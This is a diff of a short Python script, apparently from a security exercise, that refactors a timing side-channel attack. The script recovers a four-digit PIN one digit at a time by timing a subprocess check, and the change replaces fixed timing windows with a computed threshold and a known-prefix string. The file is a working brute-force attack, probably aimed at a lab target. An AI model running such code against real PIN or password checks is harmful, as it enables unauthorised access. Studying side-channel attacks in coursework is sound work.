@@ -1,21 +1,12 @@
 import time, subprocess
 
 def timeSideChannelAttack():
-    PIN = None 
-    firstNum = None
-    secondNum = None
-    thirdNum= None
+    bekannterTeil = ""
     
     for i in range(4):
         for j in range(10):
-            if firstNum is None:
-                PIN = str(j) + "000"
-            elif secondNum is None:
-                PIN = firstNum + str(j) + "00"
-            elif thirdNum is None:
-                PIN = firstNum + secondNum + str(j) + "0"
-            else:
-                PIN = firstNum + secondNum + thirdNum + str(j)
+            
+            PIN = bekannterTeil + str(j) + "0" * (3-i)  
 
             startTime = time.perf_counter()
 
@@ -28,22 +19,13 @@ def timeSideChannelAttack():
             if result.returncode == 0:
                 print(f"Found PIN: {PIN}")
                 return
+            
+            schwellenwert = (i+1) * 0.1 + 0.05
 
-            if duration > 0.15 and duration < 0.25:
-                if firstNum is None:
-                    firstNum = str(j)
-                    print(f"Found digit: {firstNum}")
-                    break
-            elif duration > 0.25 and duration < 0.35:
-                if secondNum is None:
-                    secondNum = str(j)
-                    print(f"Found digit: {firstNum}{secondNum}")
-                    break 
-            elif duration > 0.35 and duration < 0.45:
-                if thirdNum is None:
-                    thirdNum = str(j)
-                    print(f"Found digit: {firstNum}{secondNum}{thirdNum}")
-                    break
+            if duration > schwellenwert:
+                bekannterTeil += str(j)
+                print(f"Found digit: {bekannterTeil}")
+                break 
     print("PIN nicht gefunden")
 
 
